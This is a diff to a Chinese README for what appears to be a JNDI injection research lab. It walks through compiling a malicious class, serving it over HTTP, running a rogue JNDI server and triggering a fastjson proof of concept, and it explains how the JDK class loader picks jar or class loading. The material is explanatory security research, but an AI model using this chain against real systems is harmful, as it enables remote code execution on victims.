@@ -1,10 +1,10 @@
-# 一、JndiServer
+# 一、JndiServerWithRemoteJar
 
 ## 1.1 使用
 1. 编译恶意文类：javac RemoteEvilObject.java 
 2. 打包：jar cvf  remote.jar  RemoteEvilObject.class
 2. 运行HTTP服务器python -m SimpleHTTPServer 8086
-3. 运行 JndiServer.main
+3. 运行 JndiServerWithRemoteJar.main
 4. 使用fastjson的poc即可触发漏洞
 ```json
 {
@@ -14,12 +14,12 @@
 ```
 
 ## 1.2 说明
-服务端将一个`ReferenceWrapper`对象绑定到`anything`上，这个对象中`Reference`指向了一个远端地址。
-当客户端执行`InitialContext.lookup()`时，会进入`com.sun.jndi.rmi.registry.RegistryContext.decodeObject`，
-进而执行`NamingManager.getObjectInstance`获取`Reference`实例对象，本例中就是`RemoteEvilObject`，
-进而调用`javax.naming.spi.NamingManager.getObjectFactoryFromReference()`由于本地ClassPath中没有这个类，
-就会去远端下载（默认下载到的是jar包，所以需要在第2步中进行打包为jar），
-下载后就会根据这个类创建对象，从而触发漏洞
+服务端将一个`ReferenceWrapper`对象绑定到`anything`上，这个对象中`Reference`设置了一个远端地址。当客户端
+执行`InitialContext.lookup()`时，会进入`com.sun.jndi.rmi.registry.RegistryContext.decodeObject`，
+进而执行`NamingManager.getObjectInstance`获取`Reference`实例对象，本例中就是`RemoteEvilObject`，进而
+调用`javax.naming.spi.NamingManager.getObjectFactoryFromReference()`由于本地ClassPath中没有这个类，
+就会去远端下载（因为`factoryLocation`的值不以`/`结尾，所以会按照jar包去解析下载的数据（原因参考`2.2`），因
+此需要在第2步中进行打包为jar），下载后就会根据这个类创建对象，从而触发漏洞。
 ```java
 public class NamingManager {
 
@@ -114,10 +114,53 @@ JndiClient.main(JndiClient.java:28)
 
 **这也是为什么RMI的方式并不是那么通用的原因**
 
-# 二、JndiServerUseLocalClassFactory
-Jndi提供的`ReferenceWrapper`包含的Class对象在客户端的ClassPath中存在，就不存在访问远程Codebase的限制了
+# 二、JndiServerWithRemoteClass
 
 ## 2.1 使用
+
+1. 编译恶意文类：javac RemoteEvilObject.java 
+2. 运行HTTP服务器python -m SimpleHTTPServer 8086
+3. 运行 JndiServerWithRemoteClass.main
+4. 使用fastjson的poc即可触发漏洞
+
+## 2.2 说明
+
+跟进`sun.misc.URLClassPath#getLoader(Final Url url)`可知，当`url.getFile()`以`/`结尾时，
+就会去该url下载具体的类名。本例中就是去`http://127.0.01:8086/`下载`RemoteEvilObject.class`。
+如下为`getLoader`源码。
+```java
+public class URLClassPath {
+    /*
+     * Returns the Loader for the specified base URL.
+     */
+    private Loader getLoader(final URL url) throws IOException {
+        try {
+            return java.security.AccessController.doPrivileged(
+                new java.security.PrivilegedExceptionAction<Loader>() {
+                public Loader run() throws IOException {
+                    String file = url.getFile();
+                    if (file != null && file.endsWith("/")) {
+                        if ("file".equals(url.getProtocol())) {
+                            return new FileLoader(url);
+                        } else {
+                            return new Loader(url);
+                        }
+                    } else {
+                        return new JarLoader(url, jarHandler, lmap);
+                    }
+                }
+            });
+        } catch (java.security.PrivilegedActionException pae) {
+            throw (IOException)pae.getException();
+        }
+    }
+}
+```
+
+# 三、JndiServerUseLocalClassFactory
+Jndi提供的`ReferenceWrapper`包含的Class对象在客户端的ClassPath中存在，就不存在访问远程Codebase的限制了
+
+## 3.1 使用
 1. 直接运行`JndiServerUseLocalClassFactory`
 2. 客户端运行即可弹出计算器
 
@@ -125,3 +168,4 @@ Jndi提供的`ReferenceWrapper`包含的Class对象在客户端的ClassPath中�
 [关于 JNDI 注入](https://paper.seebug.org/417/)
 [如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)
 [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
+[BlackHat 2016 回顾之 JNDI 注入简单解析](https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/)
